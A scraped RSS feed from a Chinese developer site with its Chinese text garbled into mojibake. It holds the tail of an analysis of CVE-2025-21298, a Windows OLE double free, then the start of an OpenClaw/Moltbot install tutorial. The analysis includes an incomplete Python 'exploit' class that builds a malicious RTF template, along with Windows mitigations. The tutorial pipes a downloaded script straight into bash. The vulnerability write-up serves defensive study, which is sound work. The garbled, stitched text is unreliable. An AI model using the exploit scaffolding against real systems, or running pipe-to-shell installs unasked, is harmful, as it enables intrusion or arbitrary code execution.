<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// RTFè§£æä¸­çš„OLEå¯¹è±¡å¤„ç†</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ProcessOLEObjectInRTF</span><span class="hljs-params">(<span class="hljs-type">const</span> RTF_DOCUMENT *doc, OLE_OBJECT *obj)</span>
</span>{
    <span class="hljs-comment">// è§£æOLEç›¸å…³æµæ•°æ®</span>
    STREAM *presStream = <span class="hljs-built_in">FindStream</span>(doc, <span class="hljs-string">"\\objupdate"</span>);
    STREAM *contentsStream = <span class="hljs-built_in">FindStream</span>(doc, <span class="hljs-string">"\\objdata"</span>);
    
    <span class="hljs-comment">// è°ƒç”¨æ¼æ´å‡½æ•°</span>
    IStream *pstmContents = <span class="hljs-literal">NULL</span>;
    HRESULT hr = <span class="hljs-built_in">UtOlePresStmToContentsStm</span>(presStream, &amp;pstmContents);
    
    <span class="hljs-comment">// å¤„ç†ç»“æœ</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">SUCCEEDED</span>(hr) &amp;&amp; pstmContents != <span class="hljs-literal">NULL</span>)
    {
        <span class="hljs-comment">// æ­£å¸¸å¤„ç†å†…å®¹æµ</span>
        <span class="hljs-built_in">ProcessContentsStream</span>(pstmContents);
        
        <span class="hljs-comment">// æ³¨æ„ï¼šè¿™é‡Œåº”è¯¥æœ‰é€‚å½“çš„é‡Šæ”¾</span>
        pstmContents-&gt;<span class="hljs-built_in">Release</span>();
    }
    
    <span class="hljs-comment">// é—®é¢˜ï¼šåœ¨æŸäº›é”™è¯¯è·¯å¾„ä¸‹ï¼Œå¯èƒ½å¯¼è‡´pstmContentsè¢«å¤šæ¬¡é‡Šæ”¾</span>
}
</code></pre>
<h4 data-id="heading-15">å†…å­˜ç®¡ç†è·Ÿè¸ªä»£ç </h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// ç”¨äºè·Ÿè¸ªå†…å­˜æ“ä½œçš„è¾…åŠ©å‡½æ•°</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TrackMemoryOperation</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *operation)</span>
</span>{
    <span class="hljs-type">static</span> std::map&lt;<span class="hljs-type">void</span>*, <span class="hljs-type">int</span>&gt; allocation_count;
    
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(operation, <span class="hljs-string">"allocate"</span>) == <span class="hljs-number">0</span>)
    {
        allocation_count[ptr] = <span class="hljs-number">1</span>;
        <span class="hljs-built_in">Log</span>(<span class="hljs-string">"Allocated: %p"</span>, ptr);
    }
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(operation, <span class="hljs-string">"release"</span>) == <span class="hljs-number">0</span>)
    {
        <span class="hljs-keyword">if</span> (allocation_count.<span class="hljs-built_in">find</span>(ptr) != allocation_count.<span class="hljs-built_in">end</span>())
        {
            <span class="hljs-keyword">if</span> (allocation_count[ptr] == <span class="hljs-number">0</span>)
            {
                <span class="hljs-comment">// æ£€æµ‹åˆ°åŒé‡é‡Šæ”¾ï¼</span>
                <span class="hljs-built_in">LogError</span>(<span class="hljs-string">"Double free detected: %p"</span>, ptr);
                <span class="hljs-comment">// è§¦å‘å´©æºƒæˆ–è®°å½•æ¼æ´</span>
                <span class="hljs-built_in">TriggerExploitCondition</span>();
            }
            <span class="hljs-keyword">else</span>
            {
                allocation_count[ptr]--;
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-16">æ¼æ´è§¦å‘æ¡ä»¶æ¨¡æ‹Ÿ</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CVE202521298Exploit</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.rtf_template = <span class="hljs-string">"""{\\rtf1\\ansi\\ansicpg1252
\\objupdate
{\\*\\oleobj
\\objemb
{\\*\\objdata
%s
}
}}"""</span>
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_exploit_payload</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""æ„é€ è§¦å‘åŒé‡é‡Šæ”¾çš„æ¶æ„æ•°æ®"""</span>
        payload = {
            <span class="hljs-string">'pres_stream_data'</span>: self.craft_pres_stream(),
            <span class="hljs-string">'contents_stream_data'</span>: self.craft_contents_stream(),
            <span class="hljs-string">'trigger_sequence'</span>: self.generate_trigger_sequence()
        }
        
        <span class="hljs-comment"># ç¡®ä¿æ•°æ®æ ¼å¼èƒ½è§¦å‘ç‰¹å®šçš„ä»£ç è·¯å¾„</span>
        <span class="hljs-keyword">return</span> self.format_for_rtf(payload)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">craft_pres_stream</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""æ„é€ Presentation Streamæ•°æ®"""</span>
        <span class="hljs-comment"># è®¾è®¡ç‰¹å®šçš„æ•°æ®æ ¼å¼å’Œå¤§å°</span>
        <span class="hljs-comment"># ä»¥æ§åˆ¶å†…å­˜åˆ†é…å’Œé‡Šæ”¾çš„æ—¶æœº</span>
        stream_data = <span class="hljs-string">b'\x00'</span> * <span class="hljs-number">512</span>  <span class="hljs-comment"># ç‰¹å®šå¤§å°</span>
        
        <span class="hljs-comment"># æ·»åŠ æ§åˆ¶ä¿¡æ¯ä»¥å½±å“æ‰§è¡Œæµç¨‹</span>
        control_info = struct.pack(<span class="hljs-string">'&lt;I'</span>, <span class="hljs-number">0xDEADBEEF</span>)
        stream_data += control_info
        
        <span class="hljs-keyword">return</span> stream_data
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_trigger_sequence</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""ç”Ÿæˆè§¦å‘åŒé‡é‡Šæ”¾çš„æ“ä½œåºåˆ—"""</span>
        <span class="hljs-comment"># æ§åˆ¶RTFè§£æå™¨æ‰§è¡Œç‰¹å®šè·¯å¾„</span>
        <span class="hljs-comment"># ä½¿å¾—pstmContentsè¢«å¤šæ¬¡é‡Šæ”¾</span>
        trigger = []
        
        <span class="hljs-comment"># ç¬¬ä¸€æ¬¡æ“ä½œï¼šæ­£å¸¸åˆ†é…</span>
        trigger.append((<span class="hljs-string">'allocate'</span>, <span class="hljs-string">'pstmContents'</span>))
        
        <span class="hljs-comment"># è§¦å‘é”™è¯¯æ¡ä»¶</span>
        trigger.append((<span class="hljs-string">'error'</span>, <span class="hljs-string">'stream_parse'</span>))
        
        <span class="hljs-comment"># é”™è¯¯å¤„ç†ä¸­çš„é‡Šæ”¾</span>
        trigger.append((<span class="hljs-string">'release'</span>, <span class="hljs-string">'pstmContents'</span>))
        
        <span class="hljs-comment"># åç»­æ“ä½œä¸­çš„å†æ¬¡é‡Šæ”¾</span>
        trigger.append((<span class="hljs-string">'release'</span>, <span class="hljs-string">'pstmContents'</span>))
        
        <span class="hljs-keyword">return</span> trigger
</code></pre>
<h3 data-id="heading-17">ğŸ“Š å½±å“ç³»ç»Ÿç‰ˆæœ¬</h3>
<h4 data-id="heading-18">å—å½±å“æ“ä½œç³»ç»Ÿ</h4>
<ul>
<li><strong>Windows 10</strong>ï¼šç‰ˆæœ¬1507è‡³22H2</li>
<li><strong>Windows 11</strong>ï¼šæ‰€æœ‰ç‰ˆæœ¬è‡³24H2</li>
<li><strong>Windows Server</strong>ï¼š
<ul>
<li>2008, 2008 R2</li>
<li>2012, 2012 R2</li>
<li>2016, 2019, 2022, 2025</li>
</ul>
</li>
</ul>
<h3 data-id="heading-19">ğŸ›¡ï¸ ç¼“è§£æªæ–½</h3>
<h4 data-id="heading-20">1. å®˜æ–¹ä¿®å¤</h4>
<ul>
<li><strong>å®‰è£…å¾®è½¯2025å¹´1æœˆå®‰å…¨æ›´æ–°</strong>ï¼šå®Œå…¨ä¿®å¤æ­¤æ¼æ´</li>
<li>é€šè¿‡Windows Updateè·å–æœ€æ–°è¡¥ä¸</li>
</ul>
<h4 data-id="heading-21">2. ä¸´æ—¶é˜²æŠ¤æªæ–½</h4>
<ul>
<li>
<p><strong>é…ç½®Outlookä»¥çº¯æ–‡æœ¬æ˜¾ç¤ºé‚®ä»¶</strong>ï¼š</p>
<pre><code class="hljs language-powershell" lang="powershell"># ç»„ç­–ç•¥æˆ–æ³¨å†Œè¡¨è®¾ç½®
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Outlook\Options\Mail" -Name "ReadAsPlain" -Value 1
</code></pre>
</li>
<li>
<p><strong>é˜»æ–­RTFé™„ä»¶</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># é‚®ä»¶ç½‘å…³è¿‡æ»¤è§„åˆ™</span>
block file-extension <span class="hljs-string">"rtf"</span>
block mime-type <span class="hljs-string">"application/rtf"</span>
</code></pre>
</li>
<li>
<p><strong>ç¦ç”¨OLEé¢„è§ˆåŠŸèƒ½</strong>ï¼š</p>
<pre><code class="hljs language-powershell" lang="powershell"># é€šè¿‡ç»„ç­–ç•¥ç¦ç”¨Officeä¸­çš„OLEå¯¹è±¡é¢„è§ˆ
</code></pre>
</li>
</ul>
<h4 data-id="heading-22">3. ä¼ä¸šçº§é˜²æŠ¤ç­–ç•¥</h4>
<ul>
<li><strong>ç½‘ç»œå±‚é¢</strong>ï¼šåœ¨è¾¹ç•Œè®¾å¤‡è¿‡æ»¤RTFæ–‡ä»¶</li>
<li><strong>ç»ˆç«¯é˜²æŠ¤</strong>ï¼šéƒ¨ç½²å…·æœ‰å†…å­˜ä¿æŠ¤åŠŸèƒ½çš„ç«¯ç‚¹å®‰å…¨è§£å†³æ–¹æ¡ˆ</li>
<li><strong>ç”¨æˆ·æ•™è‚²</strong>ï¼šæé†’å‘˜å·¥ä¸é¢„è§ˆå¯ç–‘é‚®ä»¶</li>
<li><strong>ç›‘æ§æ£€æµ‹</strong>ï¼šéƒ¨ç½²é’ˆå¯¹å¼‚å¸¸OLEæ“ä½œçš„ç›‘æ§è§„åˆ™</li>
</ul>
<h3 data-id="heading-23">ğŸ“ˆ æŠ€æœ¯ä»·å€¼</h3>
<ol>
<li><strong>å†…å­˜å®‰å…¨ç ”ç©¶</strong>ï¼šå±•ç¤ºäº†å³ä½¿æˆç†Ÿå¦‚Windowsçš„ç³»ç»Ÿç»„ä»¶ï¼Œä¹Ÿå¯èƒ½å­˜åœ¨åŸºæœ¬çš„å†…å­˜ç®¡ç†é”™è¯¯</li>
<li><strong>é›¶ç‚¹å‡»æ”»å‡»æ¨¡å‹</strong>ï¼šåˆ†æäº†æ— éœ€ç”¨æˆ·äº¤äº’çš„æ”»å‡»å‘é‡å®ç°æ–¹å¼</li>
<li><strong>ä¼ä¸šå®‰å…¨å®è·µ</strong>ï¼šæä¾›äº†ä»æ¼æ´åˆ†æåˆ°å®é™…é˜²æŠ¤çš„å®Œæ•´è§£å†³æ–¹æ¡ˆ</li>
</ol>
<p>é€šè¿‡æ·±å…¥ç†è§£æ­¤ç±»é«˜å±æ¼æ´çš„æŠ€æœ¯ç»†èŠ‚ï¼Œå®‰å…¨ç ”ç©¶äººå‘˜å’Œé˜²å¾¡è€…å¯ä»¥æ›´å¥½åœ°é¢„é˜²å’Œåº”å¯¹ç±»ä¼¼çš„å®‰å…¨å¨èƒã€‚
6HFtX5dABrKlqXeO5PUv/84SoIo+TE3firf/5vX8AZ640BBEDuMY2EZFwLQ0rzGa</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenClaw (Moltbot) å®‰è£…æ•™ç¨‹: ä» 0 æ­å»ºæœ¬åœ° AI åŠ©æ‰‹]]></title>    <link>https://juejin.cn/post/7600752623068102666</link>    <guid>https://juejin.cn/post/7600752623068102666</guid>    <pubDate>2026-01-30T07:34:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600752623068102666" data-draft-id="7600990891206131739" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenClaw (Moltbot) å®‰è£…æ•™ç¨‹: ä» 0 æ­å»ºæœ¬åœ° AI åŠ©æ‰‹"/> <meta itemprop="keywords" content="OpenAI,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-30T07:34:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Bi"/> <meta itemprop="url" content="https://juejin.cn/user/852876756274749"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenClaw (Moltbot) å®‰è£…æ•™ç¨‹: ä» 0 æ­å»ºæœ¬åœ° AI åŠ©æ‰‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/852876756274749/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Bi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T07:34:46.000Z" title="Fri Jan 30 2026 07:34:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>Moltbot (åŸ Clawdbot) ä»Šå¤©æ”¹åä¸º:OpenClaw å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæœ¬åœ°è¿è¡Œçš„ AI ç½‘å…³å·¥å…·ï¼Œå®ƒè´Ÿè´£åœ¨å¤§æ¨¡å‹ä¸ç”µè„‘ä¹‹é—´æ­æ¡¥ï¼Œè®© AI åŠ©æ‰‹çœŸæ­£èƒ½åœ¨æœ¬åœ°å·¥ä½œã€‚å®ƒå¯ä»¥éƒ¨ç½²åœ¨ä½ çš„ä¸ªäººè®¾å¤‡ä¸Šï¼Œä¾‹å¦‚ <strong>Macã€Windows æˆ– Linux</strong>ï¼Œè®© AI ä¸åªæ˜¯åœç•™åœ¨ç½‘é¡µèŠå¤©ï¼Œè€Œæ˜¯çœŸæ­£æ¥å…¥ä½ çš„æœ¬åœ°ç¯å¢ƒä¸å¸¸ç”¨åº”ç”¨ã€‚</p>
<p>å®ƒçš„æ ¸å¿ƒä½œç”¨æ˜¯æŠŠ AI æ¨¡å‹çš„èƒ½åŠ›å’Œä½ çš„è®¾å¤‡ã€è½¯ä»¶ç”Ÿæ€è¿æ¥èµ·æ¥ï¼š</p>
<ul>
<li>ä¸€ç«¯è¿æ¥å¤§è¯­è¨€æ¨¡å‹ï¼ˆå®˜æ–¹æ¨èä½¿ç”¨ Claudeï¼ŒåŒæ—¶ä¹Ÿæ”¯æŒ Geminiã€OpenAI ç­‰ï¼‰</li>
<li>å¦ä¸€ç«¯è¿æ¥ä½ çš„æœ¬åœ°ç³»ç»Ÿä»¥åŠå¸¸è§èŠå¤©å¹³å°ï¼Œä¾‹å¦‚ï¼š
<ul>
<li>WhatsApp</li>
<li>Telegram</li>
<li>iMessage</li>
<li>Signal</li>
<li>â€¦</li>
</ul>
</li>
</ul>
<p>é€šè¿‡è¿™ç§æ–¹å¼ï¼ŒMoltbot å¯ä»¥è®© AI ä»£ç†ç›´æ¥åœ¨ä½ çš„æ—¥å¸¸å·¥å…·ä¸­å·¥ä½œï¼Œæ¯”å¦‚è‡ªåŠ¨å›å¤æ¶ˆæ¯ã€æ‰§è¡Œç³»ç»Ÿä»»åŠ¡æˆ–è§¦å‘è‡ªåŠ¨åŒ–æµç¨‹ã€‚</p>
<blockquote>
<p>æ³¨æ„ï¼šç½‘å…³æ¨¡å—é€šå¸¸éœ€è¦ç¨³å®šè®¿é—®æ¨¡å‹æ¥å£å’Œç¬¬ä¸‰æ–¹å¹³å°ã€‚å¦‚æœé€‰æ‹©åœ¨æœåŠ¡å™¨ä¸Šéƒ¨ç½²ï¼Œä¸ºé¿å… DNSã€Telegram APIã€æ¨¡å‹è®¿é—®ç­‰ç½‘ç»œé™åˆ¶é—®é¢˜ï¼Œå»ºè®®ä½¿ç”¨å¢ƒå¤–æœåŠ¡å™¨ç¯å¢ƒè¿è¡Œã€‚</p>
</blockquote>
<h2 data-id="heading-1">å‰ç½®æ¡ä»¶</h2>
<ol>
<li>ä¸€å° Linux æœåŠ¡å™¨ï¼Œ2 æ ¸ 2GB é…ç½®ï¼ˆæ¨è Ubuntuï¼‰</li>
</ol>
<h2 data-id="heading-2">æœåŠ¡å™¨</h2>
<p>æˆ‘é€‰æ‹©çš„æ˜¯ AWS æœåŠ¡å™¨ï¼Œæ–°è´¦å·æœ‰ USD $100 çš„ AWS æŠµç”¨é‡‘ï¼Œæœ‰æ•ˆæ—¶é—´åŠå¹´ï¼ŒåŸºæœ¬å¯ä»¥å…è´¹ç”¨ä¸€æ®µæ—¶é—´ã€‚</p>
<p>åœ°åŒºæˆ‘é€‰æ‹©çš„æ˜¯æ–°åŠ å¡ã€‚2 æ ¸ 2GB é…ç½®å¯ä»¥å‚è€ƒä¸‹å›¾çš„é€‰é¡¹é…ç½®ï¼š</p>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a879af8be1214255bd24a07ca5690519~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=%2FLeUxGHfesqpl7OvWZJ8mBjfJaU%3D" alt="AWS æœåŠ¡å™¨é…ç½®ç¤ºä¾‹" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    AWS æœåŠ¡å™¨å®ä¾‹é…ç½®ç¤ºä¾‹ï¼ˆ2 æ ¸ 2GBï¼‰
  </figcaption>
</figure>
<h2 data-id="heading-3">å®‰è£…</h2>
<h3 data-id="heading-4">æ‰§è¡Œç»ˆç«¯å‘½ä»¤</h3>
<pre><code class="hljs language-bash" lang="bash">curl -fsSL https://clawd.bot/install.sh | bash
</code></pre>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/49db910fe123425184c4c210d21f7182~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=b2psASofoxJ9XplDmZpZRQPuycc%3D" alt="å®‰è£…è„šæœ¬é£é™©æç¤º" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
<p>I understand this is powerful and inherently risky. Continue?</p>
<p>é€‰æ‹© <strong>Yes</strong>ã€‚</p>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9bc31547aa0f4965bf57f58271225c00~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=%2Bxha46wC9vQF%2FjQ8SOhZhlX9jFc%3D" alt="Onboarding æ¨¡å¼é€‰æ‹©" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
<p>Onboarding mode</p>
<p>é€‰æ‹© <strong>QuickStart</strong>ã€‚</p>
<h3 data-id="heading-5">é€‰æ‹©æ¨¡å‹å’Œæˆæƒ</h3>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/72829fe54f2e452b94705ebce5603646~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=gTL0xxndjlSuA46nctN2FErrtzQ%3D" alt="æ¨¡å‹ä¸æˆæƒæä¾›æ–¹é€‰æ‹©" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    é€‰æ‹©æ¨¡å‹ä¸æˆæƒæä¾›æ–¹
  </figcaption>
</figure>
<p>Model/auth provider</p>
<p>è¿™é‡Œæˆ‘é€‰æ‹©çš„æ˜¯ OpenAIï¼Œå› ä¸ºåˆšå¥½æ˜¯ ChatGPT Pro çš„ç”¨æˆ·ã€‚å¦‚æœå¤§å®¶æ²¡æœ‰ OpenAI çš„è´¦å·ï¼Œå¯ä»¥é€‰æ‹© Qwenï¼Œå…è´¹é¢åº¦è¶³å¤Ÿä½¿ç”¨ã€‚</p>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea32095640a849768d0adb1024384077~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=Ji3N1LMWUe5Aq8WXej72UT6JPQA%3D" alt="æˆæƒé“¾æ¥å±•ç¤º" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    å¤åˆ¶æˆæƒé“¾æ¥åˆ°æµè§ˆå™¨å®Œæˆæˆæƒ
  </figcaption>
</figure>
<p>é€‰æ‹©å®Œæ¨¡å‹åä¼šæ˜¾ç¤ºæˆæƒé“¾æ¥ï¼ŒæŠŠé“¾æ¥å¤åˆ¶åˆ°ä½ æœ¬æœºæµè§ˆå™¨æ‰“å¼€å®Œæˆæˆæƒã€‚</p>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fde595428fab4f6b8abd8d5080f49859~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=v5%2FzrQYGTRwXg%2Fvpk2kuLwrUpN4%3D" alt="æˆæƒå›è°ƒé“¾æ¥æç¤º" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    æˆæƒå®Œæˆåè¿”å›çš„å›è°ƒé“¾æ¥
  </figcaption>
</figure>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e698f0bcb79422fa097287969d35de8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=Kg6bYIh3O93CRIZunXhqGYMb0H8%3D" alt="æµè§ˆå™¨æˆæƒå®Œæˆåçš„è·³è½¬é“¾æ¥" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
<p>å¦‚æœé€‰æ‹©çš„æ˜¯ OpenAI æˆ– Google ç­‰æ¨¡å‹ï¼Œæˆæƒåä¼šè¿”å›ä¸€ä¸ª localhost é“¾æ¥ï¼ŒæŠŠé“¾æ¥å¤åˆ¶åˆ°ç»ˆç«¯å›è½¦å³å¯ã€‚Qwen æ¨¡å‹æˆæƒåä¸éœ€è¦è¿™ä¸€æ­¥ã€‚</p>
